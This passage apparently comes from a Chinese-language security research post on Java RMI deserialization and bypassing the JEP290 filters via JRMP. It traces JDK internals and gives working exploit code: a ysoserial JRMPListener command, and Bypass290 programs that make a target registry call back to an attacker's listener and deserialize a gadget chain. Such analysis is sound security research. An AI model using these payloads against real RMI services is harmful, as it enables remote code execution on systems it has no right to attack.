Transport var40 = var39.equals(dgcID) ? null : this;
Target var5 = ObjectTable.getTarget(new ObjectEndpoint(var39, var40));

final Dispatcher var6 = var5.getDispatcher();

try &#123;
        AccessController.doPrivileged(new PrivilegedExceptionAction&lt;Void&gt;() &#123;
            public Void run() throws IOException &#123;
                Transport.this.checkAcceptPermission(var7);
                var6.dispatch(var37, var1);
                return null;
            &#125;
        &#125;, var7);
        return true;
    &#125; catch (PrivilegedActionException var31) &#123;
        throw (IOException)var31.getException();
    &#125;
</code></pre>
<p>因为skel为空，不会调用<code>this.oldDispatch(var1, var2, var3)</code>,接着会匹配到方法，拿到方法的参数，接着进行反序列化</p>
<p><img src="/images/20230429225014.png"></p>
<p>unmarshalCustomCallData方法会因为filter为空返回</p>
<pre><code>protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException &#123;
        if (this.filter != null &amp;&amp; var1 instanceof ObjectInputStream) &#123;
            final ObjectInputStream var2 = (ObjectInputStream)var1;
            AccessController.doPrivileged(new PrivilegedAction&lt;Void&gt;() &#123;
                public Void run() &#123;
                    Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
                    return null;
                &#125;
            &#125;);
        &#125;

    &#125;
</code></pre>
<p>unmarshalParameters方法中会调用unmarshalValue进行反序列化，高版本会判断是否为String类型</p>
<pre><code>if (var0.isPrimitive()) &#123;
    ...
&#125; else &#123;
    return var0 == String.class &amp;&amp; var1 instanceof ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();
&#125;

执行var1.readObject反序列化
</code></pre>
<h4 id="反制"><a href="#反制" class="headerlink" title="反制"></a>反制</h4><p>创建恶意的服务端</p>
<pre><code>Registry registry = LocateRegistry.createRegistry(1099);
CommonsBeanutils1 cb = new CommonsBeanutils1();
Object payload = cb.getObject(&quot;calc&quot;);
Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(&quot;1azy&quot;, payload), Remote.class);
registry.bind(&quot;test&quot;,new RemoteInterfaceImpl());
registry.bind(&quot;remote&quot;,remote);
</code></pre>
<p>当客户端调用lookup()来攻击服务端时，客户端会对var4进行反序列化，并且这个var4的serialfilter为空</p>
<p><img src="/images/20230429232356.png"></p>
<h3 id="利用JRMP反序列化绕过JEP290"><a href="#利用JRMP反序列化绕过JEP290" class="headerlink" title="利用JRMP反序列化绕过JEP290"></a>利用JRMP反序列化绕过JEP290</h3><h4 id="前置知识-x2F-原理"><a href="#前置知识-x2F-原理" class="headerlink" title="前置知识&#x2F;原理"></a>前置知识&#x2F;原理</h4><p>我们首先看到DGC客户端与DGC服务端通信<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>，dirty方法通过<code>super.ref.invoke(var5);</code>进入<code>UnicastRef#invoke(java.rmi.server.RemoteCall)</code>来处理服务端返回的请求</p>
<pre><code>public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException &#123;
    try &#123;
        //开启了一个连接，似曾相识的 669196253586618813L 在服务端也有
        RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);

        try &#123;
            //获取连接的输入流
            ObjectOutput var6 = var5.getOutputStream();
            //***DGC客户端攻击DGC服务端的payload写入处***
            var6.writeObject(var1);
            var6.writeLong(var2);
            var6.writeObject(var4);
        &#125; catch (IOException var20) &#123;
            throw new MarshalException(&quot;error marshalling arguments&quot;, var20);
        &#125;
        //进入此处
        super.ref.invoke(var5);
</code></pre>
<p>invoke方法中会调用executeCall方法</p>
<pre><code>public void invoke(RemoteCall call) throws Exception &#123;
        try &#123;
            clientRefLog.log(Log.VERBOSE, &quot;execute call&quot;);

            call.executeCall();
</code></pre>
<p>客户端会根据returnType进入相应的case，当这个returnType标识为报错信息的时候，则会反序列化报错返回，</p>
<pre><code>public void executeCall() throws Exception &#123;
byte returnType;

// read result header
DGCAckHandler ackHandler = null;
try &#123;
    ...
    returnType = in.readByte();
    in.readID();        // id for DGC acknowledgement
&#125; catch (UnmarshalException e) &#123;
    ...
&#125;

// read return value
switch (returnType) &#123;
case TransportConstants.NormalReturn:
    break;

case TransportConstants.ExceptionalReturn:
    Object ex;
    try &#123;
        ex = in.readObject();
    &#125; catch (Exception e) &#123;
        throw new UnmarshalException(&quot;Error unmarshaling return&quot;, e);
    &#125;
</code></pre>
<p>那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的</p>
<blockquote>
<p>yso exploit的JRMPlistener攻击代码直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。</p>
</blockquote>
<p>全局搜索<code>TransportConstants.Exceptional</code>找到<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code></p>
<pre><code>public ObjectOutput getResultStream(boolean success) throws IOException &#123;
    /* make sure result code only marshaled once. */
    if (resultStarted)
        throw new StreamCorruptedException(&quot;result already in progress&quot;);
    else
        resultStarted = true;

    // write out return header
    // return header, part 1 (read by Transport)
    DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
    wr.writeByte(TransportConstants.Return);// transport op
    getOutputStream(true);  // creates a MarshalOutputStream
    // return header, part 2 (read by client-side RemoteCall)
    if (success)            //
        out.writeByte(TransportConstants.NormalReturn);
    else
        out.writeByte(TransportConstants.ExceptionalReturn);
    out.writeID();          // write id for gcAck
    return out;
&#125;
</code></pre>
<p>根据传入的boolean，为false就会<code>out.writeByte(TransportConstants.ExceptionalReturn);</code>，我们看看谁调用了这个方法</p>
<p><img src="/images/20230430142407.png"></p>
<p><code>sun.rmi.server.UnicastServerRef#dispatch</code>和<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>中，但代码一样，写入了报错信息：</p>
<pre><code>catch (Throwable e) &#123;
    logCallException(e);
    ObjectOutput out = call.getResultStream(false);
    if (e instanceof Error) &#123;
            e = new ServerError(
                &quot;Error occurred in server thread&quot;, (Error) e);
        &#125; else if (e instanceof RemoteException) &#123;
            e = new ServerException(
                &quot;RemoteException occurred in server thread&quot;,
                (Exception) e);
        &#125;
</code></pre>
<p>后一处在<code>sun.rmi.transport.Transport#serviceCall</code>中，清空了调用栈，然后写入了报错信息。</p>
<pre><code>try &#123;
    ObjectOutput out = call.getResultStream(false);
    UnicastServerRef.clearStackTraces(e);
    out.writeObject(e);
    call.releaseOutputStream();

&#125; catch (IOException ie) &#123;
</code></pre>
<p>服务端的这三处就可以写入payload去发起对于客户端的请求，但是我们发现无法利用原生的参数来发起请求，因为他们都是报错信息。<br>所以需要我们构造一个服务端，来发送给JRMP客户端一个序列化数据，这就是YSOSERIAL-exploit-JRMPListener做的事情。</p>
<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>JRMP服务端 </p>
<pre><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;
</code></pre>
<p>JRMP客户端</p>
<pre><code>Registry registry_remote = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);
registry_remote.lookup(&quot;remote&quot;);
</code></pre>
<p>JDK8u121是可以复现的，<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制</strong></p>
<p><img src="/images/20230430144001.png"></p>
<p>原因：</p>
<blockquote>
<p>JEP290默认只为RMI注册表（RMI Register层）和RMI分布式垃圾收集器（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。</p>
</blockquote>
<h4 id="与RMI服务端反序列化攻击RMI注册端-Bind结合"><a href="#与RMI服务端反序列化攻击RMI注册端-Bind结合" class="headerlink" title="与RMI服务端反序列化攻击RMI注册端-Bind结合"></a>与RMI服务端反序列化攻击RMI注册端-Bind结合</h4><p>JRMP服务端打JRMP客户端:</p>
<ol>
<li>要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）</li>
<li>我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。</li>
<li>由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。</li>
</ol>
<p>这个攻击组合中<strong>唯一缺失的板块</strong>就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成<strong>让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求</strong>，从而完成一整个攻击链的衔接，这需要我们去寻<strong>找一个所有对象都在白名单中的Gadget</strong>去完成这一任务。</p>
<p>目标：</p>
<ol>
<li>我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。</li>
<li>在找到这个Gadget之后，我们需要进一步将它封装进入<code>register.bind(String,Remote)</code>中。（为了满足客户端的格式需求）</li>
</ol>
<p>找Gadget：</p>
<h5 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h5><p>首先我们要知道反序列化的入口不止<code>readObject</code>还有<code>readExternal</code></p>
<p>来到sun.rmi.server.UnicastRef#readExternal:</p>
<pre><code>public void readExternal(ObjectInput in)
        throws IOException, ClassNotFoundException
    &#123;
        ref = LiveRef.read(in, false);//---进入此处----
    &#125;
</code></pre>
<p><code>sun.rmi.transport.LiveRef#read</code>：</p>
<pre><code>public static LiveRef read(ObjectInput in, boolean useNewFormat)
        throws IOException, ClassNotFoundException
    &#123;
        Endpoint ep;
        ObjID id;

        // 从输入流中读取endpoint, id和result flag
        // 一个固定的格式版本判断，根据JDK版本有关
        if (useNewFormat) &#123;
            ep = TCPEndpoint.read(in);
        &#125; else &#123;
            //读取
            ep = TCPEndpoint.readHostPortFormat(in);
        &#125;
        id = ObjID.read(in);
        boolean isResultStream = in.readBoolean();
        //恢复一个LiveRef对象(可以理解为一个连接对象)
        //此处可以由我们的序列化对象进行指定。
        LiveRef ref = new LiveRef(id, ep, false);
        //判断输入流in是不是已经是一个对象流了，这里都会为true
        if (in instanceof ConnectionInputStream) &#123;
            ConnectionInputStream stream = (ConnectionInputStream)in;
            // 保存ref以在所有参数/返回都被解析后再发送&quot;dirty&quot;调用。
            stream.saveRef(ref);
            if (isResultStream) &#123;
                stream.setAckNeeded();
            &#125;
        &#125; else &#123;
            //-----这里会产生一个误区，实际上我们进入的不是这个registerRefs----
            DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] &#123; ref &#125;));
        &#125;

        return ref;
    &#125;
</code></pre>
<p>进入<code>stream.saveRef(ref);</code>中，将ref填入流中的<code>incomingRefTable</code>这个Map中</p>
<pre><code>void saveRef(LiveRef ref) &#123;
    Endpoint ep = ref.getEndpoint();

    // check whether endpoint is already in the hashtable
    List&lt;LiveRef&gt; refList = incomingRefTable.get(ep);

    if (refList == null) &#123;
        refList = new ArrayList&lt;LiveRef&gt;();
        incomingRefTable.put(ep, refList);
    &#125;

    // add ref to list of refs for endpoint ep
    refList.add(ref);
&#125;
</code></pre>
<p>至此，<strong>ref填入完成</strong>，反序列化执行完毕，我们来到反序列化点<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>中的case0，</p>
<pre><code>case 0:
    try &#123;
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        //payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal
        var8 = (Remote)var11.readObject();
    &#125; catch (IOException var94) &#123;
        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var94);
    &#125; catch (ClassNotFoundException var95) &#123;
        throw new UnmarshalException(&quot;error unmarshalling arguments&quot;, var95);
    &#125; finally &#123;
        //在这里处理ref的时候才真正完成了触发
        var2.releaseInputStream();
    &#125;

    var6.bind(var7, var8);
</code></pre>
<p>在<code>var2.releaseInputStream();</code>会对我们填入的ref进行处理，我们更跟进</p>
<pre><code>public void releaseInputStream() throws IOException &#123;
    /* WARNING: Currently, the UnicastRef.java invoke methods rely
     * upon this method not throwing an IOException.
     */

    try &#123;
        ...
        //统一处理去DGC注册之前readobject解析出来的ref
        in.registerRefs();
        in.done(conn);
        &#125;
        conn.releaseInputStream();
    &#125; finally &#123;
        in = null;
    &#125;
</code></pre>
<p><code>sun.rmi.transport.ConnectionInputStream#registerRefs:</code>从之前readobject语句解析出来的<code>incomingRefTable</code>中读取ref。</p>
<pre><code>void registerRefs() throws IOException &#123;
    if (!incomingRefTable.isEmpty()) &#123;
        for (Map.Entry&lt;Endpoint, List&lt;LiveRef&gt;&gt; entry :
                 incomingRefTable.entrySet()) &#123;
            DGCClient.registerRefs(entry.getKey(), entry.getValue());
        &#125;
    &#125;
&#125;
</code></pre>
<p><code>sun.rmi.transport.DGCClient#registerRefs</code>：</p>
<pre><code>static void registerRefs(Endpoint ep, List&lt;LiveRef&gt; refs) &#123;
    /*
     * Look up the given endpoint and register the refs with it.
     * The retrieved entry may get removed from the global endpoint
     * table before EndpointEntry.registerRefs() is able to acquire
     * its lock; in this event, it returns false, and we loop and
     * try again.
     */
    EndpointEntry epEntry;
    do &#123;
        epEntry = EndpointEntry.lookup(ep);
    &#125; while (!epEntry.registerRefs(refs));
&#125;
</code></pre>
<p>un.rmi.transport.DGCClient.EndpointEntry#registerRefs:</p>
<pre><code>public boolean registerRefs(List&lt;LiveRef&gt; refs) &#123;
            assert !Thread.holdsLock(this);

            Set&lt;RefEntry&gt; refsToDirty = null;     // entries for refs needing dirty
            long sequenceNum;           // sequence number for dirty call
            //阻塞执行，去遍历查询LiveRef实例
            synchronized (this) &#123;
                //省略此处代码，就是做遍历查询的事情
            &#125;
            //为所有结果参与DGC垃圾回收机制注册
            //------进入此处------
            makeDirtyCall(refsToDirty, sequenceNum);
            return true;
        &#125;
</code></pre>
<p><code>sun.rmi.transport.DGCClient.EndpointEntry#makeDirtyCall</code>:(这里会发出DGC客户端的dirty请求)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void makeDirtyCall(Set&lt;RefEntry&gt; refEntries, long sequenceNum) &#123;</span><br><span class="line">            assert !Thread.holdsLock(this);</span><br><span class="line">            //根据refEntries得到注册用的ids</span><br><span class="line">            ObjID[] ids;</span><br><span class="line">            if (refEntries != null) &#123;</span><br><span class="line">                ids = createObjIDArray(refEntries);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ids = emptyObjIDArray;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            long startTime = System.currentTimeMillis();</span><br><span class="line">            try &#123;</span><br><span class="line">                //进入此处，进行dirty请求</span><br><span class="line">                Lease lease =</span><br><span class="line">                    dgc.dirty(ids, sequenceNum, new Lease(vmid, leaseValue));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>进入<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                ObjectOutput var6 = var5.getOutputStream();</span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; catch (IOException var20) &#123;</span><br><span class="line">                throw new MarshalException(&quot;error marshalling arguments&quot;, var20);</span><br><span class="line">            &#125;</span><br><span class="line">            //JRMP服务端打JRMP客户端的反序列化触发点在这里面</span><br><span class="line">            super.ref.invoke(var5);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里就是JRMP服务端打JRMP客户端，JRMP客户端的漏洞触发点。</p>
<p>知道服务端反序列化处的触发流程之后，我们来看payload的构造。</p>
<p>一个基础的可以指定连接目标的UnicastRef对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//让受害者主动去连接的攻击者的JRMPlister的host和port</span><br><span class="line">public static UnicastRef generateUnicastRef(String host, int port) &#123;</span><br><span class="line">    java.rmi.server.ObjID objId = new java.rmi.server.ObjID();</span><br><span class="line">    sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">    sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false);</span><br><span class="line">    return new sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>如何让这个对象反序列化呢？</strong> 还需要进一步的封装。</p>
<p>我们的目标是：将UnicastRef对象封装进入<code>register.bind(String,Remote)</code>的Remote参数中，从而在反序列化Remote参数的时候因为反序列化的递归的特性，进行UnicastRef对象的反序列化。那又回归到了前面讨论过的问题，如何将UnicastRef对象封装成Remote类型：</p>
<ol>
<li><p>压根不封装，跟Barmie工具一样自实现通讯协议，直接发送UnicastRef（因为其实只有客户端上层函数需要remote类型的输入，服务端并没有要求是remote类型，都会反序列化）</p>
</li>
<li><p>跟RMIRegisterExploit一样，使用<strong>动态代理</strong>来实现封装</p>
</li>
<li><p>找一个同时继承实现两者的类或者一个实现Remote，并将UnicastRef类型作为其一个字段的类。这样只需要把我们的UnicastRef对象塞入这个类中，然后直接塞进<code>register.bind(String,Remote)</code>中就可以了。</p>
</li>
</ol>
<h5 id="1-绕过客户端-自实现协议"><a href="#1-绕过客户端-自实现协议" class="headerlink" title="1.绕过客户端-自实现协议"></a>1.绕过客户端-自实现协议</h5><h5 id="2-动态代理-自定义"><a href="#2-动态代理-自定义" class="headerlink" title="2.动态代理-自定义"></a>2.动态代理-自定义</h5><p>代码参考github-Bypass290_proxy.java</p>
<p>我们自定义一个PocHandler拦截器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static class PocHandler implements InvocationHandler, Serializable &#123;</span><br><span class="line">    private RemoteRef ref;//来放我们的UnicastRef对象</span><br><span class="line"></span><br><span class="line">    protected PocHandler(RemoteRef newref) &#123;//构造方法，来引入UnicastRef</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        return this.ref //只是为了满足拦截类的格式，随便写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把生成UnicastRef放入PocHandler拦截器，然后转变为Remote类型。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        String jrmpListenerHost = &quot;127.0.0.1&quot;;</span><br><span class="line">        int jrmpListenerPort = 1199;</span><br><span class="line">        UnicastRef unicastRef = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        Remote remote = (Remote) Proxy.newProxyInstance(RemoteRef.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Remote.class&#125;, new PocHandler(unicastRef));</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(1099);//本地测试</span><br><span class="line">        registry.bind(&quot;2333&quot;, remote);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"><a href="#2-动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）" class="headerlink" title="2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）"></a>2.动态代理-RemoteObjectInvocationHandler（Ysoserial-Payload-JRMPClient）</h5><blockquote>
<p>这其实就是Ysoserial-Payload-JRMPClient模块生成的payload的实现逻辑</p>
</blockquote>
<p>假如不自定义一个拦截器，去jdk环境中寻找也是可以找到的——<strong>RemoteObjectInvocationHandler</strong></p>
<ol>
<li>它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
<li>同时是一个 拦截器。（这表示我们可以通过动态代理把他改成任意的接口）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class RemoteObjectInvocationHandler</span><br><span class="line">    extends RemoteObject</span><br><span class="line">    implements InvocationHandler //表示是一个拦截器</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//构造函数，传入一个RemoteRef接口类型的变量</span><br><span class="line">    public RemoteObjectInvocationHandler(RemoteRef ref) &#123;</span><br><span class="line">        super(ref);</span><br><span class="line">        if (ref == null) &#123;</span><br><span class="line">            throw new NullPointerException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//而UnicastRef类型实现RemoteRef接口，即可以传入</span><br><span class="line">//public class UnicastRef implements RemoteRef &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>super(ref);</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br><span class="line">    /** The object&#x27;s remote reference. */</span><br><span class="line">    transient protected RemoteRef ref;</span><br><span class="line"></span><br><span class="line"> //super(ref)的内容，可以成功塞入变量中</span><br><span class="line">     protected RemoteObject(RemoteRef newref) &#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然而这里会有一个神奇的问题，我们知道<code>transient</code>修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？</p>
<p>但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。</p>
<p><code>java.rmi.server.RemoteObject#writeObject</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream out)</span><br><span class="line">        throws java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        if (ref == null) &#123;</span><br><span class="line">            throw new java.rmi.MarshalException(&quot;Invalid remote object&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String refClassName = ref.getRefClass(out);</span><br><span class="line">            if (refClassName == null || refClassName.length() == 0) &#123;</span><br><span class="line">                //不会进入的地方....</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /*</span><br><span class="line">                 * Built-in reference class specified, so delegate</span><br><span class="line">                 * to reference to write out its external form.</span><br><span class="line">                 */</span><br><span class="line">                 //我们的序列化操作会进入到这里对于ref进行序列化</span><br><span class="line">                out.writeUTF(refClassName);</span><br><span class="line">                ref.writeExternal(out);</span><br><span class="line">                //在这里通过writeExternal来写入了ref</span><br><span class="line">                //（transient类型的变量可以通过writeExternal来写入序列化）</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。</p>
<p>那么在确定<strong>RemoteObjectInvocationHandler</strong>可以填入一个<strong>UnicastRef对象</strong>并且不影响序列化之后。接下来就是利用动态代理进行类型转变</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Bypass290 &#123;</span><br><span class="line">    //省略generateUnicastRef方法</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        //获取UnicastRef对象</span><br><span class="line">        String jrmpListenerHost = &quot;127.0.0.1&quot;;//本地测试</span><br><span class="line">        int jrmpListenerPort = 1199;</span><br><span class="line">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        //通过构造函数封装进入RemoteObjectInvocationHandler</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span><br><span class="line">        //所以接下来bind可以填入proxy</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span><br><span class="line">                                                           new Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">        //触发漏洞</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(1099);//本地测试</span><br><span class="line">        registry.bind(&quot;hello&quot;, proxy);//填入payload</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="3-找一个带UnicastRef类型参数的实现Remote接口的类"><a href="#3-找一个带UnicastRef类型参数的实现Remote接口的类" class="headerlink" title="3.找一个带UnicastRef类型参数的实现Remote接口的类"></a>3.找一个带UnicastRef类型参数的实现Remote接口的类</h5><p>那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。</p>
<ol>
<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
<li>这个类要是Remote接口的</li>
</ol>
<h6 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h6><p>其实<strong>RemoteObjectInvocationHandler</strong>本身就是一个实现了Remote接口的类。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//RemoteObjectInvocationHandler定义，继承自RemoteObject</span><br><span class="line">public class RemoteObjectInvocationHandler</span><br><span class="line">    extends RemoteObject</span><br><span class="line">    implements InvocationHandler</span><br><span class="line"></span><br><span class="line">//RemoteObject定义，实现了Remote接口</span><br><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。</p>
<ol>
<li>而UnicastRef对象是在RemoteObject类中赋值的</li>
<li>RemoteObject类又是一个Remote接口</li>
</ol>
<p>那么理论上来说所有RemoteObject的子类都是可以的</p>
<p>我们选取<strong>RMIConnectionImpl_Stub</strong>和<strong>UnicastRemoteObject</strong>来举例说明</p>
<h6 id="RMIConnectionImpl-Stub"><a href="#RMIConnectionImpl-Stub" class="headerlink" title="RMIConnectionImpl_Stub"></a>RMIConnectionImpl_Stub</h6><p>RMIConnectionImpl_Stub是可以利用的。</p>
<p>是Remote接口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//RMIConnectionImpl_Stub类定义，继承自RemoteStub类</span><br><span class="line">public final class RMIConnectionImpl_Stub</span><br><span class="line">    extends java.rmi.server.RemoteStub</span><br><span class="line">    implements javax.management.remote.rmi.RMIConnection&#123;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteStub 定义，继承自RemoteObject类</span><br><span class="line">abstract public class RemoteStub extends RemoteObject &#123;</span><br><span class="line"></span><br><span class="line">//RemoteObject定义，实现Remote接口</span><br><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>利用构造方法可以容纳一个UnicastRef对象：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法</span><br><span class="line">public RMIConnectionImpl_Stub(java.rmi.server.RemoteRef ref) &#123;</span><br><span class="line">    super(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法</span><br><span class="line"> protected RemoteStub(RemoteRef ref) &#123;</span><br><span class="line">        super(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法</span><br><span class="line">protected RemoteObject(RemoteRef newref) &#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了</p>
<h6 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h6><p>UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。</p>
<p>它的确是Remote接口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//java.rmi.server.UnicastRemoteObject定义</span><br><span class="line">public class UnicastRemoteObject extends RemoteServer &#123;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteServer定义</span><br><span class="line">public abstract class RemoteServer extends RemoteObject//这个就是了 不赘述</span><br><span class="line">&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。</p>
<p>我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//3.UnicastRemoteObject</span><br><span class="line"> //3.1.获取到UnicastRemoteObject的实例</span><br><span class="line"> Class clazz = Class.forName(&quot;java.rmi.server.UnicastRemoteObject&quot;);</span><br><span class="line"> Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line"> m.setAccessible(true);</span><br><span class="line"> UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();</span><br><span class="line"> //3.2.修改实例的ref参数（使用yso中的模块）</span><br><span class="line"> Reflections.setFieldValue(UnicastRemoteObject_obj,&quot;ref&quot;,ref);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是在实际利用的时候，<strong>使用UnicastRemoteObject是不可以的！</strong></p>
<p>其实关键点在于：</p>
<ul>
